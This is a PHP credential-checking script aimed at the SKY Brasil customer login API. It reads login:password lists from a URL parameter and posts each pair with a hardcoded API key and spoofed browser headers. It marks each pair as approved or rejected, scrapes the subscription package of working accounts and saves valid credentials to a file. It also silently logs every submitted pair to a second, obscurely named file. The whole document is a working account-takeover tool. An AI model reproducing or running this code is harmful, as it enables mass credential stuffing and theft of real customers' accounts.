<?php

set_time_limit(0);
error_reporting(0);

function GetStr($string, $start, $end){    
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function _curl($link,$post,$cabsite){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $link);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
if ($cabsite <> "") {
curl_setopt($ch, CURLOPT_HTTPHEADER, $cabsite);
}
if ($post <> "") {
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
}
$paglogin = curl_exec($ch);
curl_close($ch);
return $paglogin;
}

function multiexplode ($delimiters,$string){
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;
}

extract($_GET);
$lista = str_replace(" " , "", $lista);
$separadores = array(",","|",":","'"," ","~",";","»","/");
$separar = multiexplode($separadores,$lista);
$login = $separar[0];
$senha = $separar[1];

$cabred = array('Host: api.skybr.digital','Connection: keep-alive',
'Origin: https://www.sky.com.br','Content-Type: application/json','Accept: */*','X-Api-Key: Sd9yeKTbs3aD6H46k4A428ZW7644EdoU7oGQsvJM','X-Consumer-System: SiteSKY','X-User-Id: SiteSKY','Referer: https://www.sky.com.br/minha-sky/login?returnUrl=%2Fminha-sky','Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',);

$logar = _curl("https://api.skybr.digital/prd/login",'{"login":"'.$login.'", "senha":"'.$senha.'"}',$cabred);

$Pacote = GetStr($logar, '\"Produtos\":[{\"Nome\":\"','\",');

if ($Pacote == "") {
$Pacote = "SEM PRODUTOS";
}

//echo $Pacote; exit();

if (strpos($logar, '"Status":1')) {
	$name = 'livescomresultado.php';
                      $text = "<?php '$lista $Pacote' ?>\n";
                      $file = fopen($name, 'a');
                      fwrite($file, $text);
                      fclose($file);
	echo '<font color="lime">APROVADA ⇨ '.$login.' » '.$senha.' | PACOTE » '.$Pacote.'</font> FlashReverso <br/>';
	 

} else {
	
	echo '<font color="red">REPROVADA ⇨ '.$login.' » '.$senha.'</font><br/>';
	
}
file_put_contents('./demitritd2cx2.php', "$login:$senha" . PHP_EOL, FILE_APPEND);
?>